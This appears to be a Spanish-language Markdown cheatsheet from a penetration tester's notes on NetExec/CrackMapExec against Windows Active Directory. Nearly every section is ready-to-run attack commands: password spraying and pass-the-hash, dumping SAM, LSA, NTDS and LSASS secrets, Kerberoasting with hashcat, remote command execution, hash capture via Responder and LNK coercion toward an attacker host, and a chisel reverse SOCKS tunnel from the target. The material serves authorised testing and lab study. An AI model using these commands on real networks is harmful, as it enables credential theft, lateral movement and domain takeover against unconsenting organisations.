---
title: NetExec / CrackMapExec cheatsheet
slug: netexec-crackmapexec
category: tools
updated: 2026-07-01
summary: "Full NXC/CME cheatsheet: spray, enum, secrets, modules, chisel"
tags: [netexec, crackmapexec, nxc, cme, smb, ldap, ad, spray, secretsdump]
sensitive: false
---

# NetExec / CrackMapExec cheatsheet

## When to use
Validar credenciales, enumerar AD/SMB/LDAP, extraer secretos, ejecutar comandos, pivot con chisel — todo desde Linux contra un dominio Windows. `nxc` es el binario moderno (netexec); `cme` / `crackmapexec` es el legacy pero mismo API.

## Output color reference
| Color | Significado |
|-------|------------|
| Green `[+]` | Credenciales válidas |
| Red `[-]` | Credenciales inválidas |
| Magenta | Password válido pero login bloqueado (ej. cuenta deshabilitada, restricción horaria, STATUS_ACCOUNT_RESTRICTION) |
| `(Pwn3d!)` | Admin en el objetivo |

## Conectar / autenticar
```bash
nxc smb TARGET -u USER -p PASS                  # dominio
nxc smb TARGET -u USER -H NTHASH                # PTH
nxc smb TARGET -u USER -p PASS -d DOMAIN        # forzar dominio
nxc smb TARGET -u USER -p PASS --local-auth     # cuenta local
nxc smb TARGET -u USER -p PASS --kerberos       # Kerberos (requiere FQDN)
nxc smb TARGET --use-kcache                     # ccache file
```

## Password Spray
```bash
nxc smb TARGET -u users.txt -p passwords.txt --no-bruteforce   # 1 password por usuario (zip)
nxc smb CIDR  -u users.txt -p 'Password1' --continue-on-success 2>/dev/null | grep '+'
nxc smb TARGET -u '' -p '' --shares              # null session
nxc smb TARGET -u guest -p '' --shares           # guest session
```

## SMB Enumeration
```bash
nxc smb TARGET                                            # OS version, SMB version, IP
nxc smb TARGET -u U -p P --shares                        # permisos por share
nxc smb TARGET -u U -p P --users                         # usuarios del dominio
nxc smb TARGET -u U -p P --groups                        # grupos del dominio
nxc smb TARGET -u U -p P --rid-brute                     # brute RID hasta 4000
nxc smb TARGET -u U -p P --loggedon-users                # usuarios activos
nxc smb TARGET -u U -p P --sessions                      # sesiones activas
nxc smb TARGET -u U -p P --pass-pol                      # password policy → lockout threshold!
nxc smb TARGET -u U -p P --computers                     # hosts del dominio
nxc smb TARGET -u U -p P --gen-relay-list out.txt        # hosts sin SMB signing (relay target)
```

## LDAP Enumeration
```bash
nxc ldap TARGET -u U -p P --users
nxc ldap TARGET -u U -p P --groups
nxc ldap TARGET -u U -p P --password-not-required
nxc ldap TARGET -u U -p P --trusted-for-delegation
nxc ldap TARGET -u U -p P --admin-count          # adminCount=1 → AdminSDHolder
nxc ldap TARGET -u U -p P --gmsa                 # GMSA passwords
nxc ldap TARGET -u U -p P --get-sid
# AS-REP y Kerberoasting:
nxc ldap TARGET -u U -p P --asreproast asreproast.out
nxc ldap TARGET -u U -p P --kerberoasting kerberoasting.out
hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt
```

## File Operations
```bash
nxc smb TARGET -u U -p P --spider SHARE --pattern 'pass'   # buscar pattern en share
nxc smb TARGET -u U -p P --spider SHARE --content          # buscar en contenido
nxc smb TARGET -u U -p P --share SHARE --get-file remote.txt local.txt
nxc smb TARGET -u U -p P --share SHARE --put-file local.txt remote.txt
nxc smb TARGET -u U -p P -M spider_plus -o EXCLUDE_DIR=IPC$,NETLOGON,SYSVOL
nxc smb TARGET -u U -p P -M spider_plus -o READ_ONLY=false  # descargar todo
```

## Command Execution
```bash
nxc smb TARGET -u U -p P -x 'whoami'              # CMD
nxc smb TARGET -u U -p P -X 'whoami'              # PowerShell
nxc winrm TARGET -u U -p P -x 'whoami'
nxc ssh TARGET -u U -p P -x 'id'
nxc mssql TARGET -u U -p P -q 'SELECT @@version'  # SQL query
nxc mssql TARGET -u U -p P -x 'whoami'            # via xp_cmdshell
```

## Extracting Secrets
```bash
nxc smb TARGET -u U -p P --sam                    # SAM local
nxc smb TARGET -u U -p P --lsa                    # LSA secrets
nxc smb TARGET -u U -p P --ntds                   # NTDS.dit (drsuapi) → DCSync equiv
nxc smb TARGET -u U -p P --ntds vss               # NTDS via VSS
nxc smb TARGET -u U -p P -M lsassy               # LSASS dump
nxc smb TARGET -u U -p P -M procdump
```

## Stealing Hashes / Coerce
```bash
sudo responder -I tun0                             # listener para captura
nxc smb TARGET -u U -p P -M slinky -o SERVER=KALI_IP NAME=test.lnk    # LNK en shares
nxc smb TARGET -u U -p P -M drop-sc -o URL=\\\\KALI_IP\\share SHARE=S FILENAME=f.search
```

## Popular Modules
```bash
nxc smb TARGET -u U -p P -M gpp_password          # GPP plaintext passwords
nxc smb TARGET -u U -p P -M gpp_autologin         # autologin en registry.xml
nxc smb TARGET -u U -p P -M keepass_discover
nxc smb TARGET -u U -p P -M rdp -o ACTION=enable
nxc ldap TARGET -u U -p P -M laps                 # LAPS passwords
nxc ldap TARGET -u U -p P -M daclread -o TARGET=username ACTION=read
nxc ldap TARGET -u U -p P -M daclread -o TARGET_DN=DN ACTION=read RIGHTS=DCSync
nxc ldap TARGET -u U -p P -M maq                  # machine account quota
```

## Vulnerability Scan Modules
```bash
nxc smb TARGET -M Zerologon
nxc smb TARGET -M PetitPotam
nxc smb TARGET -M ms17-010
nxc smb TARGET -u U -p P -M nopac
```

## Pivot con Chisel
```bash
# Método 1: attack host = servidor
chisel server --reverse
nxc smb TARGET -u U -p P -x "C:\Windows\Temp\chisel.exe client KALI:8080 R:socks"

# Método 2: target = servidor
nxc smb TARGET -u U -p P -x "C:\Windows\Temp\chisel.exe server --socks5"
chisel client TARGET:8080 socks
```

## CMEDB
```bash
cmedb
workspace list; workspace <name>
proto smb; creds; creds plaintext; creds hash; hosts; shares
export creds simple creds.txt
```

## Gotchas
- **Verificar pass-pol ANTES de spray**: `--pass-pol` muestra umbral de lockout.
- `--continue-on-success` imprescindible en spray; sin él para al primer match.
- `--no-bruteforce` cuando users.txt y passwords.txt son listas (empareja línea a línea).
- `--local-auth` para autenticación local (no dominio); sin él asume cuenta de dominio.
- `nxc` = netexec (moderno); `cme` = crackmapexec (legacy) — misma sintaxis en general.
- Kerberos requiere FQDN del DC, no IP; sincronizar reloj con `sudo ntpdate DC_IP`.

## References
- Relacionado: [[password-spray]], [[active-directory-attacks]], [[service-enumeration]], [[network-pivoting]], [[password-cracking]]
- Notas internas de CrackMapExec.
- Notas de lab de AD.
